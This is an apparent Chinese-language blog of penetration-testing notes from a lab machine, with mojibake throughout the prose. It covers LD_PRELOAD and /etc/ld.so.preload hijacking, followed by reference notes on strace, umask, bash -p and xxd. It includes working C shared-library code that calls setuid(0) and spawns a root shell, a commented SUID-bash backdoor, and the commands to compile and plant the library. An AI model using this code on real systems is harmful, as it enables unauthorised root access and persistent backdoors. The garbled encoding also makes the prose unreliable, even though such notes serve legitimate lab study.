<p>LD_PRELOAD çš„å·¥ä½œåŸç†æ˜¯ï¼Œå½“ç¨‹åºéœ€è¦è°ƒç”¨æŸä¸ªç¬¦å·æ—¶ï¼Œç³»ç»Ÿä¼šå…ˆåœ¨ç¨‹åºè‡ªèº«çš„ç¬¦å·è¡¨ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™ä¼šåœ¨ LD_PRELOAD æŒ‡å®šçš„å…±äº«åº“ä¸­æŸ¥æ‰¾ã€‚å¦‚æœåœ¨ LD_PRELOAD æŒ‡å®šçš„å…±äº«åº“ä¸­æ‰¾åˆ°äº†è¯¥ç¬¦å·ï¼Œåˆ™ä½¿ç”¨è¯¥ç¬¦å·ä¸­çš„ä»£ç ã€‚</p>
<p>ä½¿ç”¨ LD_PRELOAD å¯ä»¥å®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p>
<p>åŠ¨æ€åº“åŠ«æŒï¼šå¯ä»¥ç”¨ LD_PRELOAD æ¥åŠ«æŒç¨‹åºä¸­çš„å‡½æ•°ï¼Œæ›¿æ¢ä¸ºè‡ªå·±ç¼–å†™çš„å‡½æ•°ï¼Œå®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ã€‚</p>
<p>ç¨‹åºè°ƒè¯•ï¼šå¯ä»¥ç”¨ LD_PRELOAD æ¥æ›¿æ¢ç¨‹åºä¸­çš„å‡½æ•°ï¼Œå¢åŠ ä¸€äº›è°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œåœ¨ç¨‹åºä¸­è°ƒç”¨ printf å‡½æ•°æ—¶ï¼Œå¯ä»¥ç”¨ LD_PRELOAD æ¥æ›¿æ¢ä¸ºè‡ªå·±ç¼–å†™çš„å‡½æ•°ï¼Œè¾“å‡ºè°ƒè¯•ä¿¡æ¯ã€‚</p>
<p>åº“ç‰ˆæœ¬æ§åˆ¶ï¼šå¯ä»¥ç”¨ LD_PRELOAD æ¥å¼ºåˆ¶ç¨‹åºä½¿ç”¨æŒ‡å®šç‰ˆæœ¬çš„å…±äº«åº“ï¼Œä»¥é¿å…ç¨‹åºåœ¨ä¸åŒç‰ˆæœ¬çš„ç¯å¢ƒä¸­äº§ç”Ÿå…¼å®¹æ€§é—®é¢˜ã€‚<br>ä¸¤ç§åˆ©ç”¨ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> </span>&#123;   <span class="comment">//éœ€è¦æœç´¢æŸ¥çœ‹å‡½æ•°çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hacker.c -o hacker.so</span><br></pre></td></tr></table></figure></div>
<p>Â LD_PRELOAD ä¹Ÿèƒ½è§£æ jpg åç¼€</p>
<h2 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="/etc/ld.so.preload"></a><code>/etc/ld.so.preload</code></h2><p>Â <br>è¯¥æ–‡ä»¶æ˜¯ Linux ç³»ç»Ÿçš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®šç¨‹åºå¯åŠ¨æ—¶<strong>å¼ºåˆ¶ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.so æ–‡ä»¶ï¼‰</strong>ã€‚ä¸Â <code>LD_PRELOAD</code>Â ç¯å¢ƒå˜é‡ä¸åŒï¼Œ<code>/etc/ld.so.preload</code>Â çš„å½±å“æ˜¯<strong>ç³»ç»Ÿçº§çš„</strong>ï¼Œä¼šå¯¹æ‰€æœ‰ç”¨æˆ·å’Œè¿›ç¨‹ç”Ÿæ•ˆ<br>è¯¥æ–‡ä»¶çš„è¡Œä¸ºç±»ä¼¼äº**<code>LD_PRELOAD</code>**Â ENV å˜é‡ï¼Œä½†ä¹Ÿé€‚ç”¨äºÂ <strong>SUID äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚<br>å¦‚æœæ‚¨å¯ä»¥åˆ›å»ºå®ƒæˆ–ä¿®æ”¹å®ƒï¼Œåˆ™åªéœ€åœ¨æ¯ä¸ªæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­<strong>åŠ è½½çš„åº“ä¸­æ·»åŠ è·¯å¾„</strong>å³å¯ã€‚</p>
<p>ä¾‹å¦‚ï¼šÂ <code>echo &quot;/tmp/pe.so&quot; &gt; /etc/ld.so.preload</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="comment">//åé—¨å†™æ³•-åªç”¨ä¸€æ¬¡ system(&quot;cp /bin/bash /tmp/sh ; chmod +s /tmp/sh; rm /etc/ld.so.preload&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cd /tmp</span></span><br><span class="line"><span class="comment">//gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æ¥è§¦åˆ°è¿™ä¸ªæ˜¯åœ¨floweré¶æœºé‡Œé¢ï¼Œtouchæœ‰suidï¼Œç„¶åæ²¡æœ‰è¿™ä¸ª&#x2F;etc&#x2F;ld.so.preloadæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹umask<br>ç”¨æ³•å°±æ˜¯åœ¨åˆ›å»ºå¥½è¿™ä¸ª&#x2F;etc&#x2F;ld.so.preloadä¹‹åï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢è¾“å…¥ç¼–è¯‘å¥½çš„æ–‡ä»¶çš„ä½ç½®ï¼Œæ¯”å¦‚&#x2F;tmp&#x2F;a.so</p>
<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>Linux telnet å‘½ä»¤ç”¨äºè¿œç«¯ç™»å…¥ã€‚</p>
<p>æ‰§è¡Œ telnet æŒ‡ä»¤å¼€å¯ç»ˆç«¯æœºé˜¶æ®µä½œä¸šï¼Œå¹¶ç™»å…¥è¿œç«¯ä¸»æœºã€‚</p>
<h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">telnet <span class="selector-attr">[é€‰é¡¹]</span> &lt;ç›®æ ‡IPæˆ–ä¸»æœºå&gt; <span class="selector-attr">[ç«¯å£]</span></span><br></pre></td></tr></table></figure></div>

<p>Telnet å®¢æˆ·ç«¯å‘½å¸¸ç”¨å‘½ä»¤ï¼š<br>ã€€ã€€open : ä½¿ç”¨ openhostname å¯ä»¥å»ºç«‹åˆ°ä¸»æœºçš„ Telnet è¿æ¥ã€‚<br>ã€€ã€€close : ä½¿ç”¨å‘½ä»¤ close å‘½ä»¤å¯ä»¥å…³é—­ç°æœ‰çš„ Telnet è¿æ¥ã€‚<br>ã€€ã€€display : ä½¿ç”¨ display å‘½ä»¤å¯ä»¥æŸ¥çœ‹ Telnet å®¢æˆ·ç«¯çš„å½“å‰è®¾ç½®ã€‚<br>ã€€ã€€send : ä½¿ç”¨ send å‘½ä»¤å¯ä»¥å‘ Telnet æœåŠ¡å™¨å‘é€å‘½ä»¤ã€‚æ”¯æŒä»¥ä¸‹å‘½ä»¤ï¼š<br>ã€€ã€€ao : æ”¾å¼ƒè¾“å‡ºå‘½ä»¤ã€‚<br>ã€€ã€€ayt : â€œAre you thereâ€ å‘½ä»¤ã€‚<br>ã€€ã€€esc : å‘é€å½“å‰çš„è½¬ä¹‰å­—ç¬¦ã€‚<br>ã€€ã€€ip : ä¸­æ–­è¿›ç¨‹å‘½ä»¤ã€‚<br>ã€€ã€€synch : æ‰§è¡Œ Telnet åŒæ­¥æ“ä½œã€‚<br>ã€€ã€€brk : å‘é€ä¿¡å·ã€‚<br>åœ¨ <code>telnet</code> ä¼šè¯ä¸­ï¼Œä½¿ç”¨ <code>Ctrl + ]</code> è¿›å…¥ <code>telnet&gt;</code> æç¤ºç¬¦ï¼Œç„¶åè¾“å…¥ï¼š</p>
<h2 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h2><p><code>strace</code> æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äº<strong>åŠ¨æ€è·Ÿè¸ªç”¨æˆ·ç©ºé—´è¿›ç¨‹ä¸å†…æ ¸äº¤äº’</strong>çš„å·¥å…·ï¼Œä¸»è¦ç›‘æ§è¿›ç¨‹çš„<strong>ç³»ç»Ÿè°ƒç”¨</strong>ã€<strong>ä¿¡å·ä¼ é€’</strong>å’Œ<strong>è¿›ç¨‹çŠ¶æ€å˜æ›´</strong>ã€‚å…¶åº•å±‚é€šè¿‡å†…æ ¸çš„ <code>ptrace</code> ç‰¹æ€§å®ç°ï¼Œæ˜¯è¿ç»´å’Œå¼€å‘äººå‘˜è¯Šæ–­ç¨‹åºé—®é¢˜çš„åˆ©å™¨</p>
<h3 id="strace-è·Ÿè¸ªæµçš„è¾“å‡ºå†…å®¹"><a href="#strace-è·Ÿè¸ªæµçš„è¾“å‡ºå†…å®¹" class="headerlink" title="straceÂ è·Ÿè¸ªæµçš„è¾“å‡ºå†…å®¹"></a><strong><code>strace</code>Â è·Ÿè¸ªæµçš„è¾“å‡ºå†…å®¹</strong></h3><p>å½“ä½¿ç”¨ <code>strace</code> è·Ÿè¸ªè¿›ç¨‹æ—¶ï¼Œå…¶è¾“å‡ºä¸»è¦åŒ…å«ä»¥ä¸‹ä¿¡æ¯</p>
<ol>
<li><strong>ç³»ç»Ÿè°ƒç”¨åç§°</strong>ï¼šå¦‚Â <code>open</code>ã€<code>read</code>ã€<code>write</code>ã€<code>close</code>ã€<code>access</code>Â ç­‰ã€‚</li>
<li><strong>è°ƒç”¨å‚æ•°</strong>ï¼šä»¥ç¬¦å·æˆ–åå…­è¿›åˆ¶å½¢å¼æ˜¾ç¤ºå‚æ•°ï¼ˆå¦‚æ–‡ä»¶è·¯å¾„ã€æ ‡å¿—ä½ç­‰ï¼‰ã€‚<ul>
<li>ç¤ºä¾‹ï¼š<code>open(&quot;/etc/ld.so.preload&quot;, O_RDONLY) = 3</code>ï¼Œè¡¨ç¤ºä»¥åªè¯»æ–¹å¼æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œè¿”å›æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</li>
</ul>
</li>
<li><strong>è¿”å›å€¼</strong>ï¼šç³»ç»Ÿè°ƒç”¨çš„ç»“æœçŠ¶æ€ã€‚<ul>
<li>æˆåŠŸæ—¶è¿”å›å…·ä½“å€¼ï¼ˆå¦‚æ–‡ä»¶æè¿°ç¬¦ã€å­—èŠ‚æ•°ï¼‰ï¼›</li>
<li>å¤±è´¥æ—¶è¿”å›Â <code>-1</code>Â å¹¶é™„å¸¦é”™è¯¯åŸå› ï¼ˆå¦‚Â <code>ENOENT</code>Â è¡¨ç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œ<code>EACCES</code>Â è¡¨ç¤ºæƒé™ä¸è¶³ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>è€—æ—¶ä¿¡æ¯</strong>ï¼ˆè‹¥å¯ç”¨Â <code>-T</code>Â å‚æ•°ï¼‰ï¼šæ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œæ—¶é—´ã€‚</li>
<li><strong>è¿›ç¨‹ &#x2F; çº¿ç¨‹æ ‡è¯†</strong>ï¼ˆè‹¥å¯ç”¨Â <code>-f</code>Â å‚æ•°ï¼‰ï¼šåœ¨å¤šè¿›ç¨‹ &#x2F; çº¿ç¨‹åœºæ™¯ä¸‹æ˜¾ç¤ºå…·ä½“ PID æˆ– TIDã€‚<ul>
<li>ç¤ºä¾‹ï¼š<code>[pid 17654] open(&quot;test.log&quot;, O_WRONLY)</code>ã€‚</li>
</ul>
</li>
</ol>
<h3 id="grep-Pi-open-access-no-such-file-çš„è¿‡æ»¤é€»è¾‘"><a href="#grep-Pi-open-access-no-such-file-çš„è¿‡æ»¤é€»è¾‘" class="headerlink" title="grep -Pi &quot;open|access|no such file&quot;Â çš„è¿‡æ»¤é€»è¾‘"></a><strong><code>grep -Pi &quot;open|access|no such file&quot;</code>Â çš„è¿‡æ»¤é€»è¾‘</strong></h3><p>ç”¨æˆ·é€šè¿‡æ­¤å‘½ä»¤ç­›é€‰ <code>strace</code> è¾“å‡ºä¸­çš„å…³é”®ä¿¡æ¯ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>ç›®æ ‡ç³»ç»Ÿè°ƒç”¨è¿‡æ»¤</strong>ï¼š<ul>
<li><strong><code>open</code></strong>ï¼šè·Ÿè¸ªæ–‡ä»¶æ‰“å¼€æ“ä½œï¼Œå¸¸ç”¨äºæ’æŸ¥æ–‡ä»¶è·¯å¾„é”™è¯¯ã€æƒé™é—®é¢˜æˆ–ä¾èµ–ç¼ºå¤±ã€‚</li>
<li><strong><code>access</code></strong>ï¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–å¯è®¿é—®ï¼Œç”¨äºå®šä½æƒé™é…ç½®é”™è¯¯ï¼ˆå¦‚Â <code>EACCES</code>ï¼‰æˆ–è·¯å¾„ä¸å­˜åœ¨ï¼ˆ<code>ENOENT</code>ï¼‰</li>
</ul>
<p>Â </p>
</li>
<li><strong>é”™è¯¯å…³é”®å­—è¿‡æ»¤</strong>ï¼š<ul>
<li><strong><code>no such file</code></strong>ï¼šåŒ¹é…Â <code>ENOENT</code>Â é”™è¯¯ï¼Œå¿«é€Ÿå®šä½å› æ–‡ä»¶ &#x2F; ç›®å½•ä¸å­˜åœ¨å¯¼è‡´çš„å¤±è´¥ã€‚</li>
</ul>
</li>
<li><strong>å‚æ•°è§£é‡Š</strong>ï¼š<ul>
<li><strong><code>-P</code></strong>ï¼šå¯ç”¨ Perl å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼ï¼ˆPCREï¼‰ï¼Œæ”¯æŒæ›´çµæ´»çš„åŒ¹é…è¯­æ³•ã€‚</li>
<li><strong><code>-i</code></strong>ï¼šå¿½ç•¥å¤§å°å†™ï¼Œç¡®ä¿åŒ¹é…Â <code>No Such File</code>Â æˆ–Â <code>NO SUCH FILE</code>Â ç­‰å˜ä½“<br>è¿™æ ·å­å°±æ˜¯çœ‹è°ƒç”¨äº†ä»€ä¹ˆï¼Œç¬¬ä¸€æ¬¡è®°å½•è¿™ä¸ªæŒ‡ä»¤æ˜¯åœ¨floweré¶æœºä¸­ï¼Œtouchæœ‰suidï¼Œç„¶åè¿½è¸ªtouchï¼Œå‘ç°æ²¡æœ‰&#x2F;etc&#x2F;ld.so.preload</li>
</ul>
</li>
</ol>
<h3 id="æ ¸å¿ƒåŠŸèƒ½"><a href="#æ ¸å¿ƒåŠŸèƒ½" class="headerlink" title="æ ¸å¿ƒåŠŸèƒ½"></a><strong>æ ¸å¿ƒåŠŸèƒ½</strong></h3><ul>
<li><strong>è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨</strong>ï¼šè®°å½•è¿›ç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨çš„æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚Â <code>open</code>ã€<code>read</code>ã€<code>write</code>Â ç­‰ï¼‰ï¼ŒåŒ…æ‹¬å‚æ•°ã€è¿”å›å€¼å’Œè€—æ—¶ã€‚</li>
<li><strong>ä¿¡å·ç›‘æ§</strong>ï¼šæ•è·è¿›ç¨‹æ¥æ”¶å’Œå‘é€çš„ä¿¡å·ï¼ˆå¦‚Â <code>SIGKILL</code>ï¼‰ã€‚</li>
<li><strong>é»‘ç›’åˆ†æ</strong>ï¼šå½“ç¨‹åºæ— æ—¥å¿—æˆ–æ—¥å¿—ä¸æ¸…æ™°æ—¶ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨å®šä½é—®é¢˜æ ¹æºã€‚</li>
</ul>
<h2 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h2><p>Linux umask å‘½ä»¤æŒ‡å®šåœ¨å»ºç«‹æ–‡ä»¶æ—¶é¢„è®¾çš„æƒé™æ©ç ã€‚</p>
<p>umask å¯ç”¨æ¥è®¾å®š [æƒé™æ©ç ]ã€‚[æƒé™æ©ç ] æ˜¯ç”± 3 ä¸ªå…«è¿›åˆ¶çš„æ•°å­—æ‰€ç»„æˆï¼Œå°†ç°æœ‰çš„å­˜å–æƒé™å‡æ‰æƒé™æ©ç åï¼Œå³å¯äº§ç”Ÿå»ºç«‹æ–‡ä»¶æ—¶é¢„è®¾çš„æƒé™ã€‚</p>
<h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">umask: usage: umask <span class="comment">[-p]</span> <span class="comment">[-S]</span> <span class="comment">[mode]</span></span><br></pre></td></tr></table></figure>
<p>-pï¼šæ‰“å°å½“å‰ umask å€¼</p>
<p>-Sï¼šæ˜¾ç¤ºå½“å‰æ©ç </p>
<p>modeï¼šè®¾ç½®ä¸º umask å€¼<br>è¿™ä¸ªç”¨åœ¨å¦‚æœç±»ä¼¼äºtouchè¿™æ ·åˆ›å»ºæ–‡ä»¶çš„æŒ‡ä»¤æœ‰suidçš„æ—¶å€™æœ‰ç”¨ï¼Œå› ä¸ºæ™®é€šçš„æ—¶å€™ç”¨æˆ·å¯ä»¥ç”¨chmodç›´æ¥ä¿®æ”¹æ–‡ä»¶çš„æƒé™ï¼Œå°±æ²¡ä»€ä¹ˆç”¨<br>umaskçš„æƒé™ä¿®æ”¹æ–¹å¼å’Œchmodæ˜¯ç›¸åçš„ï¼Œchmodæ˜¯ç›´æ¥ç»™æƒé™ï¼Œumaskæ˜¯ç”¨666å‡å»æƒé™ï¼Œæ¯”å¦‚umaskæ˜¯022 é‚£åˆ›å»ºä¹‹åçš„æƒé™å°±æ˜¯644</p>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p>bashé™¤äº†ç›´æ¥è·å¾—ä¸€ä¸ªbashè¿˜æœ‰ä¸€äº›å…³é”®å­—å’Œå‚æ•°</p>
<h3 id="Bash-è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°"><a href="#Bash-è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°" class="headerlink" title="Bash è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°"></a><strong>Bash è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°</strong></h3><p>è„šæœ¬å†…é€šè¿‡ <code>$0</code>ã€<code>$1</code>ã€<code>$2</code> ç­‰å¼•ç”¨å‚æ•°ï¼Œç‰¹æ®Šå‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong><code>$0</code></strong>ï¼šè„šæœ¬æ–‡ä»¶åï¼ˆåŒ…å«è·¯å¾„ï¼‰Â </li>
<li><strong><code>$1</code>ã€<code>$2</code>ã€â€¦</strong>ï¼šç¬¬ 1ã€2 ä¸ªå‚æ•°ï¼Œä¾æ¬¡ç±»æ¨Â </li>
<li><strong><code>$#</code></strong>ï¼šå‚æ•°ä¸ªæ•°ï¼ˆä¸åŒ…å«Â <code>$0</code>ï¼‰Â </li>
<li><strong><code>$@</code>Â ä¸Â <code>$*</code></strong>ï¼šæ‰€æœ‰å‚æ•°åˆ—è¡¨ï¼ŒåŒºåˆ«åœ¨äºÂ <code>&quot;$@&quot;</code>Â ä¸ºæ•°ç»„ï¼Œ<code>&quot;$*&quot;</code>Â ä¸ºå•ä¸ªå­—ç¬¦ä¸²Â </li>
<li><strong><code>$?</code></strong>ï¼šä¸Šä¸€æ¡å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç ï¼ˆ0 è¡¨ç¤ºæˆåŠŸï¼‰Â </li>
<li><strong><code>$$</code></strong>ï¼šå½“å‰è¿›ç¨‹çš„ PIDÂ <br>ç¤ºä¾‹</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/test.sh a b c # $0=./</span>test.sh, <span class="variable">$1</span>=a, <span class="variable">$2</span>=b, <span class="variable">$3</span>=c, <span class="variable">$#</span>=<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<h3 id="äº¤äº’æ¨¡å¼å’Œè„šæœ¬æ¨¡å¼"><a href="#äº¤äº’æ¨¡å¼å’Œè„šæœ¬æ¨¡å¼" class="headerlink" title="äº¤äº’æ¨¡å¼å’Œè„šæœ¬æ¨¡å¼"></a><strong>äº¤äº’æ¨¡å¼å’Œè„šæœ¬æ¨¡å¼</strong></h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-i</code></td>
<td><strong>äº¤äº’æ¨¡å¼</strong>ï¼ˆinteractive modeï¼‰ï¼ŒBash å¯åŠ¨åä¼šæä¾›å‘½ä»¤æç¤ºç¬¦ã€‚</td>
</tr>
<tr>
<td><code>-c &quot;command&quot;</code></td>
<td>è¿è¡Œ<strong>å•ä¸ªå‘½ä»¤</strong>åé€€å‡ºï¼Œå¦‚ï¼š<code>bash -c &#39;echo Hello&#39;</code></td>
</tr>
<tr>
<td><code>-s</code></td>
<td>è®© Bash ä» <strong>æ ‡å‡†è¾“å…¥</strong> è¯»å–å‘½ä»¤ï¼Œå¦‚ï¼š&#96;echo â€˜echo helloâ€™</td>
</tr>
<tr>
<td><code>--rcfile file</code></td>
<td>æŒ‡å®š <strong>è‡ªå®šä¹‰å¯åŠ¨æ–‡ä»¶</strong>ï¼ˆè€Œä¸æ˜¯ <code>~/.bashrc</code>ï¼‰ã€‚</td>
</tr>
</tbody></table>
<h3 id="æƒé™ä¸å®‰å…¨"><a href="#æƒé™ä¸å®‰å…¨" class="headerlink" title="æƒé™ä¸å®‰å…¨"></a><strong>æƒé™ä¸å®‰å…¨</strong></h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-p</code></td>
<td><strong>ä¿ç•™ç‰¹æƒæ¨¡å¼</strong>ï¼ˆprivileged modeï¼‰ï¼Œå³ä¸é™ä½ SUID&#x2F;SGID æƒé™ã€‚</td>
</tr>
<tr>
<td><code>--noprofile</code></td>
<td><strong>ä¸åŠ è½½ <code>~/.bash_profile</code> æˆ– <code>/etc/profile</code></strong>ï¼ˆé€‚ç”¨äºéäº¤äº’å¼ shellï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--norc</code></td>
<td><strong>ä¸åŠ è½½ <code>~/.bashrc</code></strong>ï¼ˆé€‚ç”¨äºäº¤äº’å¼ shellï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--restricted</code> &#x2F; <code>-r</code></td>
<td><strong>å—é™æ¨¡å¼</strong>ï¼ˆrestricted modeï¼‰ï¼Œé™åˆ¶éƒ¨åˆ† Bash åŠŸèƒ½ï¼ˆå¦‚ <code>cd</code>ã€ç¯å¢ƒå˜é‡ä¿®æ”¹ç­‰ï¼‰ã€‚</td>
</tr>
<tr>
<td>æ‰€ä»¥é€šè¿‡æŸç§æ–¹å¼å¾—åˆ°äº†&#x2F;bin&#x2F;bash å¹¶ä¸”å·²ç»chmod+s ä¹‹åå°±è¦ç”¨-på‚æ•°æ¥ç”¨è¿™ä¸ªbashï¼Œä¿æŒè¿™ä¸ªbashåŸæ¥çš„suid</td>
<td></td>
</tr>
</tbody></table>
<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p><code>xxd</code> æ˜¯ Linux ä¸‹çš„åå…­è¿›åˆ¶è½¬å‚¨å·¥å…·ï¼Œç”¨äº <strong>å°†æ–‡ä»¶æˆ–æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼</strong> æˆ– <strong>åå‘è¿˜åŸä¸ºäºŒè¿›åˆ¶</strong>ï¼Œé€‚ç”¨äºè°ƒè¯•ã€æ•°æ®åˆ†æå’ŒäºŒè¿›åˆ¶ç¼–è¾‘ç­‰åœºæ™¯</p>
<h3 id="xxd-å‘½ä»¤é€‰é¡¹"><a href="#xxd-å‘½ä»¤é€‰é¡¹" class="headerlink" title="xxd å‘½ä»¤é€‰é¡¹"></a><code>xxd</code> å‘½ä»¤é€‰é¡¹</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>ç¼ºçœå¿½ç•¥è½¬æ¢ï¼šä½¿ç”¨ <code>*</code> æ›¿æ¢ç©ºè¡Œã€‚</td>
</tr>
<tr>
<td><code>-b</code></td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼è½¬å‚¨æ•°æ®ï¼ˆä¸ <code>-ps</code>ã€<code>-i</code>ã€<code>-r</code> ä¸å…¼å®¹ï¼‰ï¼Œé»˜è®¤ä¸ºåå…­è¿›åˆ¶ã€‚</td>
</tr>
<tr>
<td><code>-c cols</code></td>
<td>æ¯è¡Œæ˜¾ç¤ºå¤šå°‘åˆ—çš„å…«ä½å­—èŠ‚ï¼ˆé»˜è®¤ 16 åˆ—ï¼Œ<code>-i</code> é€‰é¡¹é»˜è®¤ 12 åˆ—ï¼Œ<code>-ps</code> é€‰é¡¹é»˜è®¤ 30 åˆ—ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-E</code></td>
<td>ä½¿ç”¨ EBCDIC å­—ç¬¦é›†ï¼ˆé»˜è®¤ä½¿ç”¨ ASCII å­—ç¬¦é›†ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-e</code></td>
<td>ä»¥å°ç«¯æ¨¡å¼è½¬å‚¨æ•°æ®ï¼ˆä¸ <code>-ps</code>ã€<code>-i</code>ã€<code>-r</code> ä¸å…¼å®¹ï¼‰ã€‚</td>
